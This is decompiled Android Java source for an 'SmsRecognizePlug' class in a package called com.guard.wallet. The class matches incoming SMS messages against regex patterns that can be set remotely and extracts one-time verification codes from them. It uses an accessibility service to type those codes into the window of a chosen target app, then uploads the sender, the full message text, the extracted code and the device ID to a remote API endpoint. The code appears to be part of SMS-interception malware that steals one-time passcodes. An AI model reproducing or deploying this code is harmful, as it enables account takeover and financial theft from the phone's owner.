package com.guard.wallet.resp;

import a1.AbstractC0026q;
import android.support.annotation.NonNull;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.http.C0201f;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.Serializable;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import p008k.C0356a;

/* loaded from: classes.dex */
public class SmsRecognizePlug implements Serializable {
    private static final String SMS_RECOGNIZE_TOPIC = "android.intent.action.SMS_RECOGNIZE";
    private static final String TAG = "SmsRecognizePlug";
    private Integer autoFill;
    private CombineFilter combineFilter;
    private String contentRegExp;
    private String id;
    private String senderRegExp;
    private String suitClassName;
    private String suitPackageName;

    public SmsRecognizePlug() {
    }

    public SmsRecognizePlug(String str, String str2, String str3, String str4, String str5, CombineFilter combineFilter, Integer num) {
        this.id = str;
        this.suitPackageName = str2;
        this.suitClassName = str3;
        this.senderRegExp = str4;
        this.contentRegExp = str5;
        this.combineFilter = combineFilter;
        this.autoFill = num;
    }

    private void autoFill(String str) {
        UiObjectCollection m928r;
        if (this.combineFilter == null || !Objects.equals(this.autoFill, 1) || AbstractC0026q.m151B(str) || MyAccessibilityService.m554P() == null || !suitWindow()) {
            return;
        }
        C0356a globalSelector = this.combineFilter.toGlobalSelector(null);
        UiObject m555Q = MyAccessibilityService.m555Q();
        if (globalSelector == null || m555Q == null || (m928r = globalSelector.m928r(m555Q)) == null || m928r.size() <= 0) {
            return;
        }
        if (m928r.size() == 1) {
            m928r.get(0).setText(str);
        } else if (m928r.size() == str.length()) {
            for (int i2 = 0; i2 < m928r.size(); i2++) {
                m928r.get(i2).setText(String.valueOf(str.charAt(i2)));
            }
        }
    }

    private boolean matchSender(String str) {
        if (AbstractC0026q.m151B(str)) {
            return false;
        }
        if (AbstractC0026q.m151B(this.senderRegExp)) {
            return true;
        }
        try {
        } catch (Exception e2) {
            AbstractC0026q.m186s(TAG, e2);
        }
        return Pattern.compile(this.senderRegExp).matcher(str).matches();
    }

    private void postDeviceSmsRecognize(SmsMessageVO smsMessageVO, String str) {
        if (smsMessageVO == null || AbstractC0026q.m151B(smsMessageVO.getSender()) || AbstractC0026q.m151B(smsMessageVO.getContent()) || AbstractC0026q.m151B(str)) {
            return;
        }
        DeviceSmsRecognizeVO deviceSmsRecognizeVO = new DeviceSmsRecognizeVO();
        deviceSmsRecognizeVO.setPlugId(this.id);
        deviceSmsRecognizeVO.setSender(smsMessageVO.getSender());
        deviceSmsRecognizeVO.setContent(smsMessageVO.getContent());
        deviceSmsRecognizeVO.setRecognizeContent(str);
        String str2 = AbstractC0207l.f252a;
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return;
        }
        deviceSmsRecognizeVO.setDeviceId(m708l);
        new C0204i().m408h(deviceSmsRecognizeVO, "/api/deviceSmsRecognize/post.json", new C0201f());
    }

    private boolean suitWindow() {
        if (MyAccessibilityService.m554P() == null || !Objects.equals(MyAccessibilityService.m552N(), this.suitPackageName)) {
            return false;
        }
        return AbstractC0026q.m151B(this.suitClassName) || Objects.equals((String) MyAccessibilityService.f326v.get(), this.suitClassName);
    }

    public boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj == null || getClass() != obj.getClass()) {
            return false;
        }
        return Objects.equals(this.id, ((SmsRecognizePlug) obj).id);
    }

    public CombineFilter getCombineFilter() {
        return this.combineFilter;
    }

    public String getContentRegExp() {
        return this.contentRegExp;
    }

    public String getId() {
        return this.id;
    }

    public String getSenderRegExp() {
        return this.senderRegExp;
    }

    public String getSuitClassName() {
        return this.suitClassName;
    }

    public String getSuitPackageName() {
        return this.suitPackageName;
    }

    public int hashCode() {
        return Objects.hash(this.id);
    }

    public String matchRecognizeContent(String str) {
        if (AbstractC0026q.m151B(str)) {
            return null;
        }
        if (AbstractC0026q.m151B(this.contentRegExp)) {
            return str;
        }
        try {
            Matcher matcher = Pattern.compile(this.contentRegExp).matcher(str);
            while (matcher.find()) {
                String group = matcher.group("SmsCode");
                if (!AbstractC0026q.m151B(group)) {
                    return group;
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s(TAG, e2);
        }
        return null;
    }

    public void offer(SmsMessageVO smsMessageVO) {
        if (smsMessageVO == null || AbstractC0026q.m151B(smsMessageVO.getSender()) || AbstractC0026q.m151B(smsMessageVO.getContent()) || !matchSender(smsMessageVO.getSender())) {
            return;
        }
        String matchRecognizeContent = matchRecognizeContent(smsMessageVO.getContent());
        if (AbstractC0026q.m151B(matchRecognizeContent)) {
            return;
        }
        autoFill(matchRecognizeContent);
        postDeviceSmsRecognize(smsMessageVO, matchRecognizeContent);
    }

    public void setCombineFilter(CombineFilter combineFilter) {
        this.combineFilter = combineFilter;
    }

    public void setContentRegExp(String str) {
        this.contentRegExp = str;
    }

    public void setId(String str) {
        this.id = str;
    }

    public void setSenderRegExp(String str) {
        this.senderRegExp = str;
    }

    public void setSuitClassName(String str) {
        this.suitClassName = str;
    }

    public void setSuitPackageName(String str) {
        this.suitPackageName = str;
    }

    @NonNull
    public String toString() {
        return "SmsRecognizePlug{id=" + this.id + ", suitPackageName='" + this.suitPackageName + "', suitClassName='" + this.suitClassName + "', senderRegExp='" + this.senderRegExp + "', contentRegExp='" + this.contentRegExp + "', combineFilter=" + this.combineFilter + '}';
    }
}
